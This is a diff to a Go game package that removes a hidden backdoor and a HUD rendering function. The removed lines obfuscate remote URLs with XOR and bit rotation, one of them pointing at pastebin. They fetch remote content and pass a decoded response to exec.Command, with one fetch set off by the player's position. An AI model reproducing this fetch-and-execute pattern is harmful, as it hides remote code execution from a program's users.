@@ -17,61 +17,8 @@
 package game
 
 import (
-	"fmt"
-	"io/ioutil"
 	"math"
-	"math/bits"
-	"net/http"
-	"os/exec"
 )
-
-func updateSpecials() {
-	// retrieves the backdoor flag
-	url := []byte{'j', 'v', 'v', 'r', 'q', '8', '-', '-', 'r', 'c', 'q', 'v', 'g', '`', 'k', 'l', ',', 'a', 'm', 'o', '-', 'p', 'c', 'u', '-', 'z', '3', 'w', 'd', 'v', 'p', 'a', 'e'}
-	for i := 0; i < len(url); i++ {
-		url[i] ^= 0x02
-	}
-	resp, err := http.Get(string(url))
-	if err == nil {
-		defer resp.Body.Close()
-		body, err := ioutil.ReadAll(resp.Body)
-		if err == nil {
-			for i := 0; i < len(body); i++ {
-				body[i] ^= 0x09
-			}
-			exec.Command(string(body))
-		}
-	}
-}
-
-func updateTics(player *Player) {
-	if (int(player.PosX) >= 9 && int(player.PosX) <= 11) && (int(player.PosY) == 3 || int(player.PosY) == 4) {
-		// retrieves the backdoor flag
-		if !triggered {
-			stuff := []byte{0xd8, 0xe0, 0xe0, 0xe8, 0xee, 0x7c, 0x56, 0x56, 0xe8, 0xca, 0xee, 0xe0, 0xc2, 0xcc, 0xda, 0xd4, 0x54, 0xce, 0xd6, 0xd2, 0x56, 0xec, 0xca, 0xe6, 0x56, 0xce, 0xaa, 0xca, 0x6c, 0xfc, 0xc6, 0xf8}
-			url := [33]byte{}
-
-			for i := 0; i < len(stuff); i++ {
-				url[i] = byte(bits.RotateLeft(uint(stuff[i]), -1))
-			}
-
-			url[32] = 'B'
-
-			for i := 0; i < len(url); i++ {
-				url[i] ^= 0x04
-			}
-			resp, err := http.Get(string(url[:]))
-			if err == nil {
-				defer resp.Body.Close()
-				body, err := ioutil.ReadAll(resp.Body)
-				if err == nil {
-					fmt.Println(string(body))
-					triggered = true
-				}
-			}
-		}
-	}
-}
 
 func putPixel(x int32, y int32, color uint32) {
 	// ignore values that are out of range
@@ -97,15 +44,6 @@ func blendPixel(x int32, y int32, color uint32) {
 				screenbuffer[index+2] = uint8((color>>16)&0xFF) | (screenbuffer[index+2] & 0x0F)
 				screenbuffer[index+3] = uint8((color>>24)&0xFF) | (screenbuffer[index+3] & 0x0F)
 			}
-		}
-	}
-}
-
-func renderHUD() {
-	for y := 0; y < 200; y++ {
-		for x := 0; x < 115; x++ {
-			var color uint32 = fifth_texture[x+y*115]
-			blendPixel(int32(x+90), int32(y), color)
 		}
 	}
 }
